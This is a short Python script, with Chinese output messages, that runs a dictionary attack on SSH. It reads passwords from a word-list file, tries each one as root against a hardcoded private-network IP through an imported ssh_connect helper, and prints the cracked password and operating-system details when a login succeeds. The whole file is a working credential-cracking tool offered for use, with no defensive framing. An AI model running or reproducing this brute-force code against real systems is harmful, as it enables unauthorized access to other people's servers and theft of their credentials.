from ssh_connect import ssh_connect

def ssh_crack(ip, dict, user = 'root'):
	ip_passwd = []
	passwd_file = open(dict, 'r').readlines()
	for passwd in passwd_file:
		ip_passwd.append((ip, user, passwd.strip()))
	for passw in ip_passwd:
		if ssh_connect(passw)[0] == 1:
			print('-------------------------------破解成功-------------------------------')
			print('账号为:{}\n密码为:{}\n操作系统信息为:{}'.format(user, ssh_connect(passw)[1], ssh_connect(passw)[2]))
			print('---------------------------------------------------------------------')
			break
		else:
			print('正在破解ssh  账号为:{}  密码为:{}'.format(user, passw[2]))
	else:
		print('密码破解失败')

if __name__ == '__main__':
	import time
	start_time = time.time()
	ssh_crack('192.168.2.245', 'dict.txt', 'root')
	end_time = time.time()
	print('运行时间为: {} 秒'.format(end_time - start_time))